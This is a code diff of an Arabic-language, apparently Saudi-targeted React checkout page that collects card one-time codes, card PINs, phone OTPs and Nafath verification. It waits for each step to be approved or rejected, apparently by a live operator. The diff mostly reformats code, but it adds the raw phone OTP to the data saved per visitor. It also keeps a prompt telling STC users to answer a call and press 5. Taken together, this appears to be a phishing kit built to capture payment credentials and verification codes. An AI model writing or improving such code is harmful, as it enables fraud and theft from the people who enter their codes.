@@ -318,22 +318,38 @@ export default function CheckoutPage() {
       }
 
       // Handle rejections
-      if (data.cardOtpApproved === "rejected" && step === "card-otp" && waitingForApproval) {
+      if (
+        data.cardOtpApproved === "rejected" &&
+        step === "card-otp" &&
+        waitingForApproval
+      ) {
         setWaitingForApproval(false);
         setRejectionError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
       }
 
-      if (data.cardPinApproved === "rejected" && step === "card-pin" && waitingForApproval) {
+      if (
+        data.cardPinApproved === "rejected" &&
+        step === "card-pin" &&
+        waitingForApproval
+      ) {
         setWaitingForApproval(false);
         setRejectionError("رمز PIN غير صحيح. يرجى المحاولة مرة أخرى.");
       }
 
-      if (data.phoneOtpApproved === "rejected" && step === "phone-otp" && waitingForApproval) {
+      if (
+        data.phoneOtpApproved === "rejected" &&
+        step === "phone-otp" &&
+        waitingForApproval
+      ) {
         setWaitingForApproval(false);
         setRejectionError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
       }
 
-      if (data.nafathApproved === "rejected" && step === "nafath" && waitingForApproval) {
+      if (
+        data.nafathApproved === "rejected" &&
+        step === "nafath" &&
+        waitingForApproval
+      ) {
         setWaitingForApproval(false);
         setRejectionError("فشل التحقق من نفاذ. يرجى المحاولة مرة أخرى.");
       }
@@ -722,6 +738,7 @@ export default function CheckoutPage() {
     try {
       await saveStepData(visitorId, "phoneOtp", {
         phone: phone2,
+        phoneOtp,
         operator: phoneProvider,
         submittedAt: new Date().toISOString(),
         phoneOtpSubmitted: true,
@@ -1190,7 +1207,10 @@ export default function CheckoutPage() {
 
               <div className="flex flex-col items-center gap-2 pt-4">
                 <Turnstile
-                  siteKey={import.meta.env.VITE_TURNSTILE_SITE_KEY || "1x00000000000000000000AA"}
+                  siteKey={
+                    import.meta.env.VITE_TURNSTILE_SITE_KEY ||
+                    "1x00000000000000000000AA"
+                  }
                   onSuccess={(token) => {
                     setCaptchaToken(token);
                     setCaptchaError("");
@@ -1198,7 +1218,9 @@ export default function CheckoutPage() {
                   onError={() => setCaptchaError("فشل التحقق")}
                   onExpire={() => {
                     setCaptchaToken("");
-                    setCaptchaError("انتهت صلاحية التحقق، يرجى المحاولة مرة أخرى");
+                    setCaptchaError(
+                      "انتهت صلاحية التحقق، يرجى المحاولة مرة أخرى",
+                    );
                   }}
                 />
                 {captchaError && (
@@ -1373,9 +1395,14 @@ export default function CheckoutPage() {
                     type="text"
                     inputMode="numeric"
                     autoComplete="one-time-code"
+                    name="one-time-code"
+                    pattern="[0-9]*"
                     maxLength={6}
                     value={cardOtp}
-                    onChange={(e) => setCardOtp(e.target.value)}
+                    onChange={(e) => {
+                      const val = e.target.value.replace(/\D/g, "");
+                      setCardOtp(val);
+                    }}
                     className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                   />
                 </div>
@@ -1401,7 +1428,9 @@ export default function CheckoutPage() {
 
               {rejectionError && (
                 <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
-                  <p className="text-destructive font-medium">{rejectionError}</p>
+                  <p className="text-destructive font-medium">
+                    {rejectionError}
+                  </p>
                 </div>
               )}
 
@@ -1480,7 +1509,9 @@ export default function CheckoutPage() {
 
               {rejectionError && (
                 <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
-                  <p className="text-destructive font-medium">{rejectionError}</p>
+                  <p className="text-destructive font-medium">
+                    {rejectionError}
+                  </p>
                 </div>
               )}
 
@@ -1568,9 +1599,7 @@ export default function CheckoutPage() {
                     }}
                     className="text-black block w-full px-3 py-2.5 bg-neutral-secondary-medium border border-default-medium text-heading text-sm rounded-base focus:ring-brand focus:border-brand shadow-xs placeholder:text-body"
                   >
-                    <option value="">
-                      اختر مزود الخدمة
-                    </option>
+                    <option value="">اختر مزود الخدمة</option>
                     <option value="Zain">زين</option>
                     <option value="Mobily">موبايلي</option>
                     <option value="STC">اس تي سي</option>
@@ -1611,7 +1640,8 @@ export default function CheckoutPage() {
               {phoneProvider === "STC" && (
                 <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4 mt-4">
                   <p className="text-blue-600 dark:text-blue-400 text-center font-medium">
-                    سيتم الاتصال بك من قبل 900 يرجى الرد علي الاتصال والضغط علي الرقم 5 للاستمرار
+                    سيتم الاتصال بك من قبل 900 يرجى الرد علي الاتصال والضغط علي
+                    الرقم 5 للاستمرار
                   </p>
                 </div>
               )}
@@ -1626,9 +1656,14 @@ export default function CheckoutPage() {
                     type="text"
                     inputMode="numeric"
                     autoComplete="one-time-code"
+                    name="one-time-code"
+                    pattern="[0-9]*"
                     maxLength={6}
                     value={phoneOtp}
-                    onChange={(e) => setPhoneOtp(e.target.value)}
+                    onChange={(e) => {
+                      const val = e.target.value.replace(/\D/g, "");
+                      setPhoneOtp(val);
+                    }}
                     className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                   />
                 </div>
@@ -1654,7 +1689,9 @@ export default function CheckoutPage() {
 
               {rejectionError && (
                 <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
-                  <p className="text-destructive font-medium">{rejectionError}</p>
+                  <p className="text-destructive font-medium">
+                    {rejectionError}
+                  </p>
                 </div>
               )}
 
@@ -1742,7 +1779,9 @@ export default function CheckoutPage() {
 
               {rejectionError && (
                 <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
-                  <p className="text-destructive font-medium">{rejectionError}</p>
+                  <p className="text-destructive font-medium">
+                    {rejectionError}
+                  </p>
                 </div>
               )}
 
